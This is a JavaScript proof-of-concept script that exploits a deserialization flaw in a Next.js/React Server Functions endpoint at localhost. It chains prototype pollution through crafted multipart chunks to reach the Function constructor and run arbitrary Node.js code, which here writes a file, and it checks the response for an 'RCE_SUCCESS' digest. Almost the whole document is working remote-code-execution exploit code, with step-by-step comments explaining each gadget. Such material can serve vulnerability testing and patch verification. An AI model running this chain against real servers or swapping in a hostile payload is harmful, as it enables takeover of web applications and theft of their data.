(async () => {
  // Define the target URL for the vulnerable Next.js server
  const BASE_URL = "http://localhost:3001";

  // --- THE CORE EXPLOIT PAYLOAD (The Malicious RFP Chunk) ---
  const craftedChunk = {
    // 1. PRIMITIVE 1: PROTOTYPE POLLUTION & HIJACK
    // This value, "$1:__proto__:then", forces the React deserializer
    // to search up the prototype chain of chunk 1 and set this object's
    // 'then' method to the internal Chunk.prototype.then.
    // This hijacks the server's internal promise resolution flow.
    then: "$1:__proto__:then",

    // This status forces the hijacked flow into the 'initializeModelChunk'
    // function, which processes the next stage of the payload ('value').
    status: "resolved_model",

    // A required placeholder value.
    reason: -1,

    // 2. PRIMITIVE 2: TRIGGERING THE EXECUTION GADGET
    // This is the second-stage payload. It is parsed as JSON during the hijacked flow.
    // The "$B0" reference triggers the internal blob deserialization logic.
    value: '{"then": "$B0"}',

    _response: {
      // 3. EXECUTION: The actual RCE code
      // This string will be concatenated with a number and passed as an argument
      // to the 'Function' constructor (set by _formData.get).
      _prefix:
        // RCE Payload: Use Node.js 'fs' module to write "hello world" (hex) to a file.
        "process.mainModule.require('fs').writeFileSync('test.txt', `hi how you doing`);" + // Data Exfiltration: Force a redirect error with a unique digest to confirm RCE.
        " throw Object.assign(new Error('NEXT_REDIRECT'), { digest: 'RCE_SUCCESS' });",

      _formData: {
        // 4. THE GADGET: Prototype Pollution Primitive
        // This is the result of the RCE chain: it uses the prototype climb
        // to retrieve the global 'Function' constructor, which is then called
        // using the content of '_prefix'.
        get: "$1:constructor:constructor",
      },
    },
  };
  // --------------------------------------------------------------------------

  // --- Build multipart/form-data request body ---
  const formData = new FormData();
  // Chunk 0: The primary payload data
  formData.append("0", JSON.stringify(craftedChunk));
  // Chunk 1: The self-referential chunk needed to complete the exploit loop
  formData.append("1", '"$@0"');

  try {
    // Send the HTTP request
    const res = await fetch(BASE_URL, {
      method: "POST",
      headers: {
        // The 'Next-Action' header is required to direct the request
        // to the vulnerable Server Function handler.
        "Next-Action": "x",
        // The Content-Type header is correctly handled by the browser/runtime
      },
      body: formData,
    });

    const text = await res.text();
    console.log("Response Status Code:", res.status);

    // Check if the expected 500 error and the success digest were returned
    if (res.status === 500 && text.includes("RCE_SUCCESS")) {
      console.log("Exploit reported success.");
    } else if (res.status === 500) {
      console.log(
        "The exploit executed but the success digest was not found. Check the server's PWD for a file named 'test.txt'."
      );
    } else {
      console.log(
        "Unexpected response. Server may be patched or not vulnerable."
      );
      console.log(text.slice(0, 500) + (text.length > 500 ? "..." : ""));
    }
  } catch (err) {
    // A connection error often indicates the server processed the RCE and crashed/reset
    console.error("Connection Error (Likely successful RCE):", err);
    console.log("Check the server's PWD for 'test.txt'.");
  }
})();
